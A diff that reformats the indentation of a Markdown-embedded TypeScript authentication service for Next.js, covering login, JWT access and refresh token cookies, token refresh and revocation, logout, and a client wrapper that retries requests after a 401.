-				userId,
-				revoked: false,
-			},
-			data: { revoked: true },
-		})
-	}
+  /**
+   * 撤销用户的所有Refresh Token（用于"退出所有设备"）
+   */
+  async revokeAllUserRefreshTokens(userId: string): Promise<void> {
+    await this.prisma.refreshTokenMetadata.updateMany({
+      where: {
+        userId,
+        revoked: false,
+      },
+      data: { revoked: true },
+    })
+  }
 
-	/**
-	 * 清理过期的Refresh Token元数据
-	 */
-	async cleanupExpiredRefreshTokens(): Promise<number> {
-		const result = await this.prisma.refreshTokenMetadata.deleteMany({
-			where: {
-				expiresAt: {
-					lt: new Date(),
-				},
-			},
-		})
-		return result.count
-	}
+  /**
+   * 清理过期的Refresh Token元数据
+   */
+  async cleanupExpiredRefreshTokens(): Promise<number> {
+    const result = await this.prisma.refreshTokenMetadata.deleteMany({
+      where: {
+        expiresAt: {
+          lt: new Date(),
+        },
+      },
+    })
+    return result.count
+  }
 
-	/**
-	 * 登录（新版，带刷新令牌）
-	 */
-	async login(name: string, password: string) {
-		try {
-			// 1. 查找用户
-			const user = await this.prisma.user.findUnique({ where: { name } })
+  /**
+   * 登录（新版，带刷新令牌）
+   */
+  async login(name: string, password: string) {
+    try {
+      // 1. 查找用户
+      const user = await this.prisma.user.findUnique({ where: { name } })
 
-			if (!user) {
-				return { code: -1, message: '用户名或密码错误' }
-			}
+      if (!user) {
+        return { code: -1, message: '用户名或密码错误' }
+      }
 
-			// 2. 验证密码
-			const isValid = await verify(user.password, password)
-			if (!isValid) {
-				return { code: -1, message: '用户名或密码错误' }
-			}
+      // 2. 验证密码
+      const isValid = await verify(user.password, password)
+      if (!isValid) {
+        return { code: -1, message: '用户名或密码错误' }
+      }
 
-			// 3. 生成Access Token和Refresh Token
-			const accessToken = await this.generateAccessToken({
-				userId: user.id,
-				name: user.name,
-			})
-			const refreshToken = await this.generateRefreshToken(user.id)
+      // 3. 生成Access Token和Refresh Token
+      const accessToken = await this.generateAccessToken({
+        userId: user.id,
+        name: user.name,
+      })
+      const refreshToken = await this.generateRefreshToken(user.id)
 
-			// 4. 设置Cookie
-			const cookieStore = await cookies()
+      // 4. 设置Cookie
+      const cookieStore = await cookies()
 
-			// Access Token：短期，path=/ 全站可用
-			cookieStore.set('access_token', accessToken, {
-				httpOnly: true,
-				secure: process.env.NODE_ENV === 'production',
-				sameSite: 'lax',
-				maxAge: 15 * 60, // 15分钟
-				path: '/',
-			})
+      // Access Token：短期，path=/ 全站可用
+      cookieStore.set('access_token', accessToken, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: 'lax',
+        maxAge: 15 * 60, // 15分钟
+        path: '/',
+      })
 
-			// Refresh Token：长期，path=/api/auth/refresh 只在刷新时用
-			cookieStore.set('refresh_token', refreshToken, {
-				httpOnly: true,
-				secure: process.env.NODE_ENV === 'production',
-				sameSite: 'lax',
-				maxAge: 7 * 24 * 60 * 60, // 7天
-				path: '/api/auth/refresh', // 关键：只在刷新接口发送
-			})
+      // Refresh Token：长期，path=/api/auth/refresh 只在刷新时用
+      cookieStore.set('refresh_token', refreshToken, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: 'lax',
+        maxAge: 7 * 24 * 60 * 60, // 7天
+        path: '/api/auth/refresh', // 关键：只在刷新接口发送
+      })
 
-			return {
-				code: 0,
-				message: '登录成功',
-				data: {
-					user: { id: user.id, name: user.name },
-				},
-			}
-		} catch (error) {
-			console.error('登录失败:', error)
-			return { code: -1, message: '登录失败' }
-		}
-	}
+      return {
+        code: 0,
+        message: '登录成功',
+        data: {
+          user: { id: user.id, name: user.name },
+        },
+      }
+    } catch (error) {
+      console.error('登录失败:', error)
+      return { code: -1, message: '登录失败' }
+    }
+  }
 
-	/**
-	 * 刷新Access Token
-	 */
-	async refreshAccessToken(): Promise<{
-		success: boolean
-		accessToken?: string
-		error?: string
-	}> {
-		try {
-			const cookieStore = await cookies()
-			const refreshToken = cookieStore.get('refresh_token')?.value
+  /**
+   * 刷新Access Token
+   */
+  async refreshAccessToken(): Promise<{
+    success: boolean
+    accessToken?: string
+    error?: string
+  }> {
+    try {
+      const cookieStore = await cookies()
+      const refreshToken = cookieStore.get('refresh_token')?.value
 
-			if (!refreshToken) {
-				return { success: false, error: '未提供刷新令牌' }
-			}
+      if (!refreshToken) {
+        return { success: false, error: '未提供刷新令牌' }
+      }
 
-			// 验证Refresh Token
-			const verification = await this.verifyRefreshToken(refreshToken)
+      // 验证Refresh Token
+      const verification = await this.verifyRefreshToken(refreshToken)
 
-			if (!verification.isValid || !verification.userId) {
-				return { success: false, error: '刷新令牌无效或已过期' }
-			}
+      if (!verification.isValid || !verification.userId) {
+        return { success: false, error: '刷新令牌无效或已过期' }
+      }
 
-			// 获取用户信息
-			const user = await this.prisma.user.findUnique({
-				where: { id: verification.userId },
-			})
+      // 获取用户信息
+      const user = await this.prisma.user.findUnique({
+        where: { id: verification.userId },
+      })
 
-			if (!user) {
-				return { success: false, error: '用户不存在' }
-			}
+      if (!user) {
+        return { success: false, error: '用户不存在' }
+      }
 
-			// 生成新的Access Token
-			const newAccessToken = await this.generateAccessToken({
-				userId: user.id,
-				name: user.name,
-			})
+      // 生成新的Access Token
+      const newAccessToken = await this.generateAccessToken({
+        userId: user.id,
+        name: user.name,
+      })
 
-			// 设置新的Access Token Cookie
-			cookieStore.set('access_token', newAccessToken, {
-				httpOnly: true,
-				secure: process.env.NODE_ENV === 'production',
-				sameSite: 'lax',
-				maxAge: 15 * 60,
-				path: '/',
-			})
+      // 设置新的Access Token Cookie
+      cookieStore.set('access_token', newAccessToken, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: 'lax',
+        maxAge: 15 * 60,
+        path: '/',
+      })
 
-			return { success: true, accessToken: newAccessToken }
-		} catch (error) {
-			console.error('刷新令牌失败:', error)
-			return { success: false, error: '刷新失败' }
-		}
-	}
+      return { success: true, accessToken: newAccessToken }
+    } catch (error) {
+      console.error('刷新令牌失败:', error)
+      return { success: false, error: '刷新失败' }
+    }
+  }
 
-	/**
-	 * 退出登录
-	 */
-	async logout(): Promise<void> {
-		try {
-			const cookieStore = await cookies()
-			const refreshToken = cookieStore.get('refresh_token')?.value
+  /**
+   * 退出登录
+   */
+  async logout(): Promise<void> {
+    try {
+      const cookieStore = await cookies()
+      const refreshToken = cookieStore.get('refresh_token')?.value
 
-			// 如果有Refresh Token，撤销它
-			if (refreshToken) {
-				try {
-					const verification = await this.verifyRefreshToken(refreshToken)
-					if (verification.jti) {
-						await this.revokeRefreshToken(verification.jti)
-					}
-				} catch {
-					// 忽略错误，可能token已过期
-				}
-			}
+      // 如果有Refresh Token，撤销它
+      if (refreshToken) {
+        try {
+          const verification = await this.verifyRefreshToken(refreshToken)
+          if (verification.jti) {
+            await this.revokeRefreshToken(verification.jti)
+          }
+        } catch {
+          // 忽略错误，可能token已过期
+        }
+      }
 
-			// 清除Cookie
-			cookieStore.delete('access_token')
-			cookieStore.delete('refresh_token')
-		} catch (error) {
-			console.error('退出登录失败:', error)
-		}
-	}
+      // 清除Cookie
+      cookieStore.delete('access_token')
+      cookieStore.delete('refresh_token')
+    } catch (error) {
+      console.error('退出登录失败:', error)
+    }
+  }
 
-	/**
-	 * 获取当前用户
-	 */
-	async getCurrentUser(): Promise<JWTPayload | null> {
-		try {
-			const cookieStore = await cookies()
-			const accessToken = cookieStore.get('access_token')?.value
+  /**
+   * 获取当前用户
+   */
+  async getCurrentUser(): Promise<JWTPayload | null> {
+    try {
+      const cookieStore = await cookies()
+      const accessToken = cookieStore.get('access_token')?.value
 
-			if (!accessToken) {
-				return null
-			}
+      if (!accessToken) {
+        return null
+      }
 
-			const { payload } = await jwtVerify(accessToken, this.accessTokenPublicKey)
-			return payload
-		} catch {
-			return null
-		}
-	}
+      const { payload } = await jwtVerify(accessToken, this.accessTokenPublicKey)
+      return payload
+    } catch {
+      return null
+    }
+  }
 }
 
 export const authService = new AuthService()
@@ -1438,16 +1438,16 @@ import { NextResponse } from 'next/server'
 import { authService } from '@/lib/auth-service'
 
 export async function POST() {
-	const result = await authService.refreshAccessToken()
+  const result = await authService.refreshAccessToken()
 
-	if (!result.success) {
-		return NextResponse.json({ code: -1, message: result.error }, { status: 401 })
-	}
+  if (!result.success) {
+    return NextResponse.json({ code: -1, message: result.error }, { status: 401 })
+  }
 
-	return NextResponse.json({
-		code: 0,
-		message: '令牌刷新成功',
-	})
+  return NextResponse.json({
+    code: 0,
+    message: '令牌刷新成功',
+  })
 }
 ```
 
@@ -1457,109 +1457,109 @@ export async function POST() {
 // lib/api-client.ts
 
 class ApiClient {
-	private isRefreshing = false
-	private refreshSubscribers: Array<(token: string) => void> = []
+  private isRefreshing = false
+  private refreshSubscribers: Array<(token: string) => void> = []
 
-	/**
-	 * 订阅刷新成功的回调
-	 */
-	subscribeTokenRefresh(callback: (token: string) => void) {
-		this.refreshSubscribers.push(callback)
-	}
+  /**
+   * 订阅刷新成功的回调
+   */
+  subscribeTokenRefresh(callback: (token: string) => void) {
+    this.refreshSubscribers.push(callback)
+  }
 
-	/**
-	 * 通知所有订阅者
-	 */
-	notifyTokenRefresh(newToken: string) {
-		this.refreshSubscribers.forEach((callback) => callback(newToken))
-		this.refreshSubscribers = []
-	}
+  /**
+   * 通知所有订阅者
+   */
+  notifyTokenRefresh(newToken: string) {
+    this.refreshSubscribers.forEach((callback) => callback(newToken))
+    this.refreshSubscribers = []
+  }
 
-	/**
-	 * 刷新Token
-	 */
-	private async refreshToken(): Promise<boolean> {
-		if (this.isRefreshing) {
-			// 已经在刷新中，等待刷新完成
-			return new Promise((resolve) => {
-				this.subscribeTokenRefresh(() => resolve(true))
-			})
-		}
+  /**
+   * 刷新Token
+   */
+  private async refreshToken(): Promise<boolean> {
+    if (this.isRefreshing) {
+      // 已经在刷新中，等待刷新完成
+      return new Promise((resolve) => {
+        this.subscribeTokenRefresh(() => resolve(true))
+      })
+    }
 
-		this.isRefreshing = true
+    this.isRefreshing = true
 
-		try {
-			const response = await fetch('/api/auth/refresh', {
-				method: 'POST',
-			})
+    try {
+      const response = await fetch('/api/auth/refresh', {
+        method: 'POST',
+      })
 
-			if (response.ok) {
-				this.isRefreshing = false
-				this.notifyTokenRefresh('refreshed')
-				return true
-			}
+      if (response.ok) {
+        this.isRefreshing = false
+        this.notifyTokenRefresh('refreshed')
+        return true
+      }
 
-			// 刷新失败，跳转登录
-			window.location.href = '/login'
-			return false
-		} catch {
-			this.isRefreshing = false
-			window.location.href = '/login'
-			return false
-		}
-	}
+      // 刷新失败，跳转登录
+      window.location.href = '/login'
+      return false
+    } catch {
+      this.isRefreshing = false
+      window.location.href = '/login'
+      return false
+    }
+  }
 
-	/**
-	 * 发起API请求（带自动刷新）
-	 */
-	async request<T>(url: string, options: RequestInit = {}): Promise<T> {
-		// 获取当前Token
-		const accessToken = await this.getAccessToken()
+  /**
+   * 发起API请求（带自动刷新）
+   */
+  async request<T>(url: string, options: RequestInit = {}): Promise<T> {
+    // 获取当前Token
+    const accessToken = await this.getAccessToken()
 
-		// 设置请求头
-		const headers = {
-			'Content-Type': 'application/json',
-			...(accessToken && { Authorization: `Bearer ${accessToken}` }),
-			...options.headers,
-		}
+    // 设置请求头
+    const headers = {
+      'Content-Type': 'application/json',
+      ...(accessToken && { Authorization: `Bearer ${accessToken}` }),
+      ...options.headers,
+    }
 
-		let response = await fetch(url, {
-			...options,
-			headers,
-		})
+    let response = await fetch(url, {
+      ...options,
+      headers,
+    })
 
-		// 如果返回401，尝试刷新
-		if (response.status === 401) {
-			const refreshSuccess = await this.refreshToken()
+    // 如果返回401，尝试刷新
+    if (response.status === 401) {
+      const refreshSuccess = await this.refreshToken()
 
-			if (refreshSuccess) {
-				// 重新获取新Token并重试
-				const newToken = await this.getAccessToken()
-				response = await fetch(url, {
-					...options,
-					headers: {
-						...headers,
-						Authorization: `Bearer ${newToken}`,
-					},
-				})
-			}
-		}
+      if (refreshSuccess) {
+        // 重新获取新Token并重试
+        const newToken = await this.getAccessToken()
+        response = await fetch(url, {
+          ...options,
+          headers: {
+            ...headers,
+            Authorization: `Bearer ${newToken}`,
+          },
+        })
+      }
+    }
 
-		if (!response.ok) {
-			throw new Error(`请求失败: ${response.status}`)
-		}
+    if (!response.ok) {
+      throw new Error(`请求失败: ${response.status}`)
+    }
 
-		return response.json()
-	}
+    return response.json()
+  }
 
-	/**
-	 * 获取Access Token
-	 */
-	private async getAccessToken(): Promise<string | null> {
-		const { cookies } = await import('next/headers')
-		const cookieStore = await cookies()
-		return cookieStore.get('access_token')?.value || null
-	}
+  /**
+   * 获取Access Token
+   */
+  private async getAccessToken(): Promise<string | null> {
+    const { cookies } = await import('next/headers')
+    const cookieStore = await cookies()
+    return cookieStore.get('access_token')?.value || null
+  }
 }
 
 export const apiClient = new ApiClient()
